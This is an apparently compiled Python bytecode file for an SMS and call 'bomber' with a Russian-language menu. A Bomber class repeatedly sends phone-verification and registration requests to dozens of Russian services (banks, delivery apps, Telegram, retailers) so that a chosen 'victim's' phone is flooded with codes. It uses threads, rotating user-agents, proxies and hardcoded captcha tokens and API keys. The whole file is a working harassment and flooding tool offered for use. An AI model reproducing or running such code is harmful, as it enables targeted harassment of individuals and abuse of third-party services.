a
    �unaKp  �                   @   s�   d dl Z d dlZd dlmZ d dlZd dlmZ d dlmZm	Z	 d dl
Z
d dlmZ d dlmZ g g g   ZZZi Zed�dd	�Zdd
d�Zd dd�Zd!dd�Zdd� Zd"eeeed�dd�ZG dd� d�Zdd� Zdd� Zdd� Zedkr�e�  dS )#�    N)�banner)�BeautifulSoup)�
user_agent�email)�sleep)�Thread)�returnc                   C   s   dddddt � d�S )N��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�gzip, deflate, br�#ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7�no-cache�
keep-alive)�Accept�Accept-Encoding�Accept-Language�Cache-Control�
Connection�
User-Agent)r   � r   r   �main.py�default_headers   s    r   c                 K   sF   |d krt � }z&tj| f|dd�|�dt� i�� W n   Y n0 d S �N�   )�headers�timeout�proxies)r   �requests�postr   ��linkr   �kwargsr   r   r   r      s    &r   c                 K   sD   z(t j| f|dd�|�dt� i��}|W S  t jjy>   Y n0 d S r   )r   �getr   �
exceptions�RequestException)r   r   r    �rr   r   r   r!      s
    "r!   c                 K   sB   z&t j| f|dd�|�dt� i�� W n t jjy<   Y n0 d S r   )r   �putr   r"   r#   r   r   r   r   r%   $   s    &r%   c                 C   sH   dd� | D �}d} |D ]}| |7 } q| d d� dkrDd| dd �  S | S )Nc                 S   s   g | ]}|� � r|�qS r   )�isdigit)�.0�elemr   r   r   �
<listcomp>,   �    z phone_format.<locals>.<listcomp>� �   �8�7r   )�phone�	formattedr(   r   r   r   �phone_format+   s    
r1   �*)r/   �mask�mask_symbolr   c                 C   sH   d}|D ]:}||kr:|| d 7 }| t | �d d d � } q||7 }q|S )Nr+   r   r,   �����)�len)r/   r3   r4   Zformatted_phone�symbolr   r   r   �pformat5   s    
r8   c                   @   s�  e Zd Zedd�dd�Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/d0� Zd1d2� Zd3d4� Zd5d6� Zd7d8� Zd9d:� Zd;d<� Z d=d>� Z!d?d@� Z"dAdB� Z#dCdD� Z$dEdF� Z%dGdH� Z&dIdJ� Z'dKdL� Z(dMdN� Z)dOd
� ZdPdQ� Z*dRdL� Z(dSdT� Z+dUdV� Z,dWdX� Z-dYdZ� Z.d[d\� Z/d]d^� Z0d_d`� Z1dS )a�BomberN)r/   r   c                 C   s�   t jj��  || _td�}d�tj|dd��| _	d�tj|dd��| _
d�tj|dd��| _t �� | _| j� d�| _ddddd	d
dd�| _d S )NZ=123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMr+   �   )�kz
@gmail.com�XMLHttpRequestr   r   r
   z�Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36�1)�X-Requested-Withr   �Pragmar   r   r   ZDNT)r   ZpackagesZurllib3Zdisable_warningsr/   �list�join�random�choices�password�username�name�Session�sr   �android_headers)�selfr/   rF   r   r   r   �__init__A   s    
�zBomber.__init__c                 C   s2   | j tv r.tddd| j  it� d� td� q d S )Nz-https://12storeez.com/user/send-sms-code-ajaxr/   �+��jsonr   �   �r/   �phones_in_spamr   r   r   �rJ   r   r   r   �storeezO   s    
zBomber.storeezc              
   C   s>   | j tv r:tddddddt| j d�d�t� d� td	� q d S )
Nz.https://api-user.privetmir.ru/api/v2/send-code�Y�onr+   zregister-user reset-password�+* (***) ***-**-**)ZcheckApprovesZapprove1Zapprove2Zback_urlZscope�login��datar   �<   )r/   rQ   r   r8   r   r   rR   r   r   r   �	privetmirT   s    
&zBomber.privetmirc                 C   s.   | j tv r*td| j � �t� d� td� q d S )Nzohttps://www.askona.ru/api/registration/sendcode?csrf_token=c6318d07fe11be1ab54bf01527ceea4f&contact%5Bphone%5D=�r   �   )r/   rQ   r!   r   r   rR   r   r   r   �askonaY   s    
zBomber.askonac                 C   sf   | j tv rbz:t�� }t� |_|�d� |jddt| j d�d�d� W n t	yV   Y n0 t
d� q d S )Nz3https://my.pochtabank.ru/dbo/registrationService/ibz?https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber�sendrV   )Zconfirmationr/   �rN   �   )r/   rQ   r   �sessionr   r   r   r%   r8   �	Exceptionr   )rJ   rb   r   r   r   �
pochtabank^   s    

 zBomber.pochtabankc                 C   sH   | j tv rDtd�D ]&}tddd| j  it� d� td� qtd� q d S )N�   z%https://my.xtra.tv/api/signup?lang=ukr/   rL   rX   rO   �  �r/   rQ   �ranger   r   r   �rJ   �ir   r   r   �xtrai   s
    

zBomber.xtrac                 C   sH   | j tv rDtd�D ]&}tddd| j  it� d� td� qtd� q d S )N�   zJhttps://888-ru-api.prod.norway.everymatrix.com/v1/core/registration-tokensZsmsDestinationrL   rM   rZ   rf   rg   ri   r   r   r   �	kazino888p   s
    

zBomber.kazino888c                 C   sL   | j tv rHtd�D ]*}tdd t| j d�d�t� d� td� qtd� q d S )N�   �@https://mapi-order.srochnodengi.ru/api/v1/auth/landing/send-sms/�+* (***) *** - ** - **)�leadr/   rX   �   rf   )r/   rQ   rh   r   r8   r   r   ri   r   r   r   �srochnodengiw   s
    

zBomber.srochnodengic                 C   s2   | j tv r.tddd| j  it� d� td� q d S )NzLhttps://quickresto.ru/api_controller/?module=sms&method=sendRegistrationCoder/   rL   rM   rZ   rP   rR   r   r   r   �
quickresto~   s    
zBomber.quickrestoc                 C   s2   | j tv r.td| j | jddd�d� td� q d S )Nz)https://tver.n1.ru/service/Users/registerz
tver.n1.ru�owner)rW   rD   �domain�typer`   �,  )r/   rQ   r   rD   r   rR   r   r   r   �n1�   s    
z	Bomber.n1c                 C   sD   | j tv r@tddd| j  id� tddd| j  id� td� q d S )NzEhttps://www.gloria-jeans.ru/phone-verification/send-code/registration�phoneNumberrL   r`   zBhttps://www.gloria-jeans.ru/phone-verification/send-code-for-loginrO   �r/   rQ   r   r   rR   r   r   r   �gloria�   s    
zBomber.gloriac                 C   s4   | j tv r0tddd| j  d�t� d� td� q d S )Nz*https://api.wheely.com/v6/auth/oauth/tokenZ54b5174d2cc1b37a50000001rL   )Zapp_idr/   rM   rZ   rP   rR   r   r   r   �weely�   s    
zBomber.weelyc                 C   s6   | j tv r2tddddd| j iid�d� td� q d S )	Nz https://familyfriend.com/graphqla  mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {
  result: requestSignInCode(input: $input) {
    ... on ErrorPayload {
      message
      __typename
    }
    ... on RequestSignInCodePayload {
      codeLength
      __typename
    }
    __typename
  }
}
ZAuthEnterPhoneMutation�inputr/   )�query�operationName�	variablesr`   i�Q r{   rR   r   r   r   �ffriend�   s    
�
zBomber.ffriendc                 C   s6   t d�D ](}tddt| jd�it� d� td� qd S )Nrl   z https://online.lenta.com/api.php�telrV   rX   rZ   )rh   r   r8   r/   r   r   ri   r   r   r   �olenta�   s    zBomber.olentac                 C   sT   | j tv rPtddd| j  idddddd	d
dddddddddddt� dd�d� q d S )Nz?https://api-omni.x5.ru/api/v1/clients-portal/auth/send-sms-coderz   rL   zapplication/jsonr
   r   ZBearerr   r   Z30zapi-omni.x5.ruzhttps://fivepost.ruzhttps://fivepost.ru/z@"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"�?0�	"Windows"�empty�corsz
cross-site)r   r   r   ZAuthorizationr   r   zContent-LengthzContent-Type�HostZOriginr?   �Referer�	sec-ch-ua�sec-ch-ua-mobile�sec-ch-ua-platform�Sec-Fetch-Dest�Sec-Fetch-Mode�Sec-Fetch-Siter   zX-Portal-OriginrM   )r/   rQ   r   r   rR   r   r   r   �fivepost�   s    
zBomber.fivepostc                 C   sH   | j tv rDtd�D ]&}tddd| j  it� d� td� qtd� q d S )Nr   z!https://api.tinkoff.ru/v1/sign_upr/   rL   rX   rZ   rf   rg   ri   r   r   r   �tinkoff�   s
    

zBomber.tinkoffc                 C   sD   | j tv r@td�D ]"}tdd| j it� d� td� qtd� q d S )N�   z;https://lenta.com/api/v1/registration/requestValidationCoder/   rM   �x   iж  rg   ri   r   r   r   �lenta�   s
    

zBomber.lentac                 C   sH   | j tv rDtd�D ]&}tddd| j  it� d� td� qtd� q d S )Nr   z*https://my.telegram.org/auth/send_passwordr/   rL   rX   r]   rf   rg   ri   r   r   r   �telegram�   s
    

zBomber.telegramc                 C   sd   | j tv r`tdddid| j ii ddddd	d
ddddddddddt� d��ddi�d� td� q d S )Nz*https://youla.ru/web-api/auth/request_codeZtmr_lvidZ 977a8377e5cce3f740a399c4a6ebafb0r/   r	   r
   r   r   r   ztmr_reqNum=69zyoula.ru�@"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"r�   r�   ZdocumentZnavigateZnonez?1r=   )r   r   r   r   r   ZCookier�   r?   r�   r�   r�   r�   r�   r�   zSec-Fetch-UserzUpgrade-Insecure-Requestsr   zX-Youla-Jsonz+{"lvid":"977a8377e5cce3f740a399c4a6ebafb0"})�cookiesrN   r   rZ   �r/   rQ   r   r   r   rR   r   r   r   �youla�   s    
LzBomber.youlac                 C   s0   | j tv r,tdd| j  dd�d� td� q d S )Nz5https://site-api.mcdonalds.ru/api/v1/user/login/phonerL   a�  03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V)Znumberzg-recaptcha-responser`   rZ   r{   rR   r   r   r   �	mcdonalds�   s    
zBomber.mcdonaldsc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz�https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfNr/   r`   rO   r{   rR   r   r   r   �sushibox�   s    
zBomber.sushiboxc              	   C   s>   | j tv r:tdd ddt| j d�| j| jd�d� td� q d S )Nz https://pizzabox.ru/?action=auth�REGISTER�PHONErV   )�CSRF�ACTIONZMODEr�   �PASSWORD�	PASSWORD2�rY   rZ   )r/   rQ   r   r8   rD   r   rR   r   r   r   �
pizzaboxru�   s    
&zBomber.pizzaboxruc                 C   s\   t d�D ]N}tdddd| j dd�t� d� td	� td
dd| j it� d� td	� qd S )Nr   z,https://rollserv.ru/user/NewUser/?async=json�2�   ИванrL   rU   )rw   z	ext[2][1]zuser[cellphone]zuser[i_agree]rX   rZ   z$https://rollserv.ru/user/RestorePwd/rW   )rh   r   r/   r   r   ri   r   r   r   �rollserv�   s
     zBomber.rollservc                 C   s.   | j tv r*tdd| j it� d� td� q d S )Nz5https://lkdr.nalog.ru/api/v1/auth/challenge/sms/startr/   rM   r�   rP   rR   r   r   r   �nalog_ru�   s    
zBomber.nalog_ruc                 C   sr   | j tv rnzLt| j�d�jd��d�d d }| jjdt| j d�|d�|d	d
�d� W n   Y n0 t	d� q d S )Nzhttps://broniboy.ru/moscow/�html.parserzmeta[name=csrf-token]r   �contentz!https://broniboy.ru/ajax/send-smsrV   )r/   Z_csrfr<   )zX-CSRF-Tokenr>   rX   rO   )
r/   rQ   �BsrH   r!   r�   Zselectr   r8   r   )rJ   �tokenr   r   r   �broniboy�   s    
"*zBomber.broniboyc                 C   s�   | j tv r�z�tt| jjdt� d�jd�jdd�d ��	� d �
d�}|�|d � |�|d	 � |d }| jjd
dd|d| j d	d � | j| j| jdd�	t� d� W n   Y n0 td� q d S )Nzhttps://anti-sushi.ru/r\   r�   Zscript)rF   re   �"r   r,   zhttps://anti-sushi.ru/?authr+   r�   r�   )	r�   r�   rG   �NAMEr�   ZEMAILr�   r�   Z
authactiverX   rZ   )r/   rQ   �strr�   rH   r!   r   r�   Zfind_all�
splitlines�split�remover   r   rD   r   )rJ   �resultr�   r   r   r   �
anti_sushi�   s    
8<zBomber.anti_sushic                 C   s\   | j tv rXz6| jjd| jd� | jjdd| j i| jj| jd� W n   Y n0 td� q d S )Nzhttps://b-apteka.ru/lk/loginr\   z(https://b-apteka.ru/lk/send_confirm_coder/   )rN   r�   r   rZ   )r/   rQ   rH   r!   rI   r   r�   r   rR   r   r   r   �b_apteka�   s    
$zBomber.b_aptekac                 C   s.   | j tv r*tdd| j it� d� td� q d S )NzLhttps://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code�msisdn)�paramsr   rO   rP   rR   r   r   r   �mtstv�   s    
zBomber.mtstvc                 C   sF   | j tv rBtd�D ]$}td| j � d�t� d� td� qtd� q d S )Nrn   z4https://www.citilink.ru/registration/confirm/phone/+�/r\   rZ   rf   rg   ri   r   r   r   �citylink�   s
    

zBomber.citylinkc                 C   s2   | j tv r.tddd| j  it� d� td� q d S )Nz=https://eda.yandex.ru/api/v1/user/request_authentication_code�phone_numberrL   rM   rZ   rP   rR   r   r   r   �	yandexeda  s    
zBomber.yandexedac                 C   s.   | j tv r*tdd| j it� d� td� q d S )Nz-https://dodopizza.kz/api/sendconfirmationcoderz   rX   rZ   rP   rR   r   r   r   �	dodopizza  s    
zBomber.dodopizzac                 C   sL   | j tv rHz td| j dd�td�jd� W n ty<   Y n0 td� q d S )Nz3https://bmp.tv.yota.ru/api/v10/auth/register/msisdnZ123456)r�   rD   zhttps://tv.yota.ru/)rN   r�   rZ   )r/   rQ   r   r!   r�   rc   r   rR   r   r   r   �yota  s    
 zBomber.yotac                 C   s6   | j tv r2tdd| j dd � it� d� td� q d S )Nz)https://my.modulbank.ru/api/v2/auth/phoneZ	Cellphoner,   rM   rZ   rP   rR   r   r   r   �	modulbank  s    
zBomber.modulbankc                 C   sT   t d�D ]F}tdddit| jd�ddd�d	d
dddddddd�	dd� td� qd S )Nrl   z"https://new-tel.net/ajax/a_api.phprw   Zregz+* (***) ***-****u   Хочу номерa�  03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz)Zphone_nbr�   r�   z.application/json, text/javascript, */*; q=0.01r
   zru,en;q=0.9Z494z0application/x-www-form-urlencoded; charset=UTF-8zhttps://new-tel.netz)https://new-tel.net/uslugi/call-password/z�Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36r<   )	Zacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-type�origin�referer�
user-agent�x-requested-withF)r�   rY   r   ZverifyrO   )rh   r   r8   r/   r   ri   r   r   r   �new_tel  s    :zBomber.new_telc                 C   s8   | j tv r4td�D ]}tdd| j id� td� qq d S )Nr   z4https://api.sunlight.net/v3/customers/authorization/r/   r`   rZ   )r/   rQ   rh   r   r   ri   r   r   r   �sunlight  s    
zBomber.sunlightc                 C   s0   | j tv r,tddt| j d�id� td� q d S )Nz$https://www.leran.pro/user/sendCode/r/   rV   r�   r]   �r/   rQ   r   r8   r   rR   r   r   r   �leran$  s    
zBomber.leranc                 C   s:   | j tv r6tddt| j d�dd�dd�d� td	� q d S �
Nzhttps://uchi.ru/teens/gatewayZ!StudentSignUp_UserSmsLoginRequestrV   T)r/   Zconsenta  mutation StudentSignUp_UserSmsLoginRequest($phone: String!, $consent: Boolean) {
  userSmsLoginRequest(input: {phone: $phone, type: student, consentUseData: $consent}) {
    payload {
      success
      resendTimeout
      __typename
    }
    __typename
  }
}
�r�   r�   r   r`   rO   r�   rR   r   r   r   �uchi)  s    
"zBomber.uchic                 C   s2   | j tv r.tdt| j d�d d�d� td� q d S )Nro   rp   )r/   rq   r�   rr   r�   rR   r   r   r   �sro4nodengi.  s    
zBomber.sro4nodengic                 C   s(   | j tv r$td| j � �� td� q d S )Nzohttps://www.askona.ru/api/registration/sendcode?csrf_token=fd454c54c651805cbf6fb557fd4cefe0&contact%5Bphone%5D=r]   )r/   rQ   r!   r   rR   r   r   r   r^   3  s    
c                 C   s2   | j tv r.tdd| j dd � id� td� q d S )Nz'https://www.akbars.ru/api/PhoneConfirm/rz   r,   r`   rx   r{   rR   r   r   r   �akbars8  s    
zBomber.akbarsc                 C   s:   | j tv r6tddt| j d�dd�dd�d� td	� q d S r�   r�   rR   r   r   r   r�   =  s    
"c                 C   sL   | j tv rHtdd| j dd � idddddd	d
ddt� d�
d� td� q d S )NzAhttps://mgn.comfortkino.ru/local/php_interface/api/v1/user/login/r/   r,   zhttps://mgn.comfortkino.rur   z!https://mgn.comfortkino.ru/login/r�   r�   r�   r�   r�   �same-origin)
r�   �pragmar�   r�   r�   r�   �sec-fetch-dest�sec-fetch-mode�sec-fetch-siter�   rX   rZ   r�   rR   r   r   r   �comfortkinoB  s    
4zBomber.comfortkinoc                 C   sL   | j tv rHtdt| j d�� d�dddddd	d
dt� dd�
d� td� q d S )Nz[https://www.noone.ru/local/templates/noone_adaptive/partials/ajax/sms_check.php?phone=%252Bz*(***)***-**-**z(&sessid=6339fc64b7999d645d74a23f3cdd184ar   zhttps://www.noone.ru/register/r�   r�   r�   r�   r�   r�   r<   )
r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r\   rO   )r/   rQ   r!   r8   r   r   rR   r   r   r   �nooneG  s    
4zBomber.noonec                 C   sD   | j tv r@tdt| j d�� �i dddd��t� �d� td� q d S )	Nz)https://api.yarus.ru/user/exist?phone=%2Bz*(***)%20***-****ZPELQTQN2mWfml8XVYsJwaB9Qi4t8XE�3Z 4cda50a904e35432a07252cbfad08c37)z	X-API-KEYzX-APPzX-DEVICE-IDr\   rZ   )r/   rQ   r!   r8   r   r   rR   r   r   r   �yarusL  s    
,zBomber.yarusc                 C   sd   | j tv r`td| j � �i ddd��t� �d� tddd| j  ii ddd��t� �d	� td
� q d S )Nz&https://disk.megafon.ru/api/3/msisdns/zdisk.megafon.ruz#https://disk.megafon.ru/sso/confirm)r�   r�   r\   z,https://disk.megafon.ru/api/3/md_otp_tokens/r/   rL   rM   rZ   )r/   rQ   r!   r   r   r   rR   r   r   r   �megadiskQ  s    
$(zBomber.megadiskc                 C   sf   | j tv rbzBtdt� d�j}tdd| j dd � |d |d d�d	d
�d� W q  ty^   Y q 0 q d S )Nzhttps://www.technopark.ru/r\   z"https://www.technopark.ru/graphql/ZAuthStepOner,   Z	PHPSESSIDZ
tp_city_id)r/   r�   ZcityIdz�mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {
  sendOTP(phone: $phone)
}
r�   r`   )r/   rQ   r!   r   r�   r   rc   )rJ   r�   r   r   r   �
technoparkW  s    
2zBomber.technoparkc                 C   s.   | j g}|D ]}t|dd���  td� qd S )NF��target�daemonrO   )r�   r   �startr   �rJ   Zservices�functionr   r   r   �call_  s    zBomber.callc              *   C   s�   | j | j| j | j| j| j| j| j| j| j| j| j	| j
| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j | j!| j"| j#| j$| j%| j&g*}|D ]}t'|dd��(�  t)d� q�d S )NFr�   g      �?)*r�   r�   r�   r�   r�   r�   r�   r^   rs   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rS   r[   rd   rk   rm   rt   ry   r}   r   r�   r   r�   r   r   r   �ruse  s    �z
Bomber.rus)2�__name__�
__module__�__qualname__r�   rK   rS   r[   r^   rd   rk   rm   rs   rt   ry   r|   r}   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   r9   @   s`   		r9   c                   C   s(   t rt�t �td< tr$t�t�td< tS )NZHTTPZHTTPS)�httprB   �choice�proxy�httpsr   r   r   r   r   l  s
    r   c                   C   s   t �t jdkrdnd� d S )N�nt�cls�clear)�os�systemrF   r   r   r   r   r�   t  s    r�   c                  C   st  t �  tt� td� td�} | �� �rT| dkrXt �  tt� td� td� t�  �qp| dkr�t �  tt� td� td� t�  �qp| d	k�r�t �  tt� td
� td�} | �� �r�| dkr�t �  t�  n�| dk�rDt �  tt� td� td�}|dk�rt �  t�  n2t�d| � t �  tt� td� td� t�  nr| d	k�r�t �  tt� td� td�}|dk�r�t �  t�  n2t	�d| � t �  tt� td� td� t�  n$t �  tt� td� td� t�  �qp| dk�r6t �  tt� td� td�} | �� �r| dk�r�t �  tt� t
�r�t
D ]}td|� �� �q4td� td�}|dk�rjt�  |�� �r�|t
v �r�t
�|� t �  tt� td� td� t�  n$t �  tt� td� td� t�  ntd� td� t�  �q4| d	k�rxt �  tt� td� td� td�}|dk�r0t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  n�| dk�r�t �  tt� td � td�}|dk�r�t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  d S )!Nu\   

[1] Бомберы
[2] Меню прокси
[3] Информация
[4] Контактыr+   �4u?   Основа: t.me/DishonorDev
Твинк: t.me/DishonorDevlope�
   r�   u$   Приятного разьеба :)r   r�   uO   [1] http Прокси
[2] https прокси
[0] Вернуться в меню�0r=   uc   Введите прокси в формате 192.168.1.1:8080
Для отмены введите 0zhttp://u-   Прокси успешно добавлен!re   zhttps://u   Я тебя не понялuA   [1] SMS Bomber
[2] Call Bomber
[3] Остановить спам u   Номер: uw   
Для остановки спама, введите номер телефона. Для отмены введите 0u=   Спам на номер успешно остановлен!u   Неверный номер!rl   u>   Не запущенно ни одной сесси спама!ur   Внимание! Данный бомбер работает только на Российские номера!
u0   Введите номер. Для отмены 0Fr�   u   Спам на номер u    начат.ui   Введите номер жертвы в любом формате. Для отмены введите 0)r�   �printr   r~   r&   r   �mainr�   �appendr�   rQ   r�   r1   r   r9   r�   r�   r�   )Ztaskr�   r/   Zslotr   r   r   r�   x  s   
�






















r�   �__main__)N)N)N)r2   ) �rer�   r   r   Zbs4r   r�   rY   r   r   rB   �timer   �	threadingr   r�   r�   rQ   r�   �dictr   r   r!   r%   r1   r�   r8   r9   r   r�   r�   r�   r   r   r   r   �<module>   s2   
	


  . 